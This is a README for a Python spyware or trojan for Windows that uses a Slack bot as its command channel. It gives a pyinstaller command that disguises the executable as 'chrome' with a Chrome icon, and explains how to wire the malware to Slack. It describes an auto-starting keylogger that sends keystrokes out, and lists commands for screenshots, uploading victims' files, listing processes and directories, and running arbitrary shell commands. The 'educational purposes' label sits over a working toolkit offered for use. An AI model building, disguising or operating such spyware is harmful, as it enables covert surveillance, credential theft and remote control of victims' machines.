## This is a Spyware

And it is used ONLY FOR EDUCATIONAL PURPOSES: a Python-based spyware for Windows. This spyware logs keyboard inputs, it is able to take screenshots, run shell commands and obtain different information on the computer, as well as files. It is meant to be connected to a Slack server and the entire connection is made through Slack Bot commands. This connection decision was made to support administration of multiple infected machines.

## To create the .exe file

Run this command after inserting local path to trojan.py file  `pyinstaller --noconfirm --onefile --windowed --icon "<path-to-project>/troj-project/resources/Google-Chrome-Google-Chrome.ico" --name "chrome"  "<insert-full-path>/trojan.py"`

## Design

<p align="center">
  <img align="center" width="700" src="https://github.com/popolp/trojan-project-221/blob/master/resources/Design.jpg?raw=true">
</p>
  

## To connect to your Slack server

Create a `slack_bot_data.py` file in the `src` folder. Paste this block with your Bot's data:

```python 
SLACK_APP_TOKEN = your_slack_app_token
SLACK_BOT_TOKEN = your_slack_bot_token
SLACK_SIGNING_SECRET = your_slack_signing_secret
BASE_CHANNEL_ID = your_slack_main_channel_id
```

## About the keylogger

The keylogger will automatically be activated when the malware runs. It will record all keyboard inputs into a txt file, and send it in the linked Slack channel whenever the 'Shift' key is pressed.

## Available commands via Slack

* `/echo` - Simple echo command, will provide basic data on computer and channel.

* `/change_channel <slack_channel_id> <computer_name>` - Used when a new machine is connected for the first time. The admin will create a new channel in Slack and use the command to move the connection to the newly created channel. This enables communication with the machine in a unique channel, without interfering connection with different machines.

* `/capture_screen` - Captures the entire screen of the machine. Sends it in the channel. 

* `/capture_every <seconds>` - Will capture the entire screen of the machine every `<seconds>` seconds, if not provided will use the default value in the config file (5 seconds).

* `/end_capture_every` - Ends the screen capturing sequence if it was started with the /capture_every command.

* `/request_file <path>` - Given a full path, will upload any (compressed) file to the Slack channel.

* `/get_dirlist` - Retrieves the entire directory list of the machine.

* `/get_process_list` - Retrieves a list of all processes currently running on the machine.

* `/cmd <command>` - Given a command line, executes it on the machine.

* `/whos_alive` - Meant to be used on the main project channel. Pings all machines for a liveness request.

* `/terminate` - Terminates the session of the program until next startup.


## How it looks in Slack

* Keylogger output:

<p align="center">
  <img align="center" width="700" src="https://github.com/popolp/trojan-project-221/blob/master/resources/keylogger.png?raw=true">
</p>

* `/get_dirlist` and `/get_process_list` output:

<p align="center">
  <img align="center" width="700" src="https://github.com/popolp/trojan-project-221/blob/master/resources/dirlist_processlist.png?raw=true">
</p>

* `/capture_screen` output:

<p align="center">
  <img align="center" width="700" src="https://github.com/popolp/trojan-project-221/blob/master/resources/screenshot.png?raw=true">
</p>
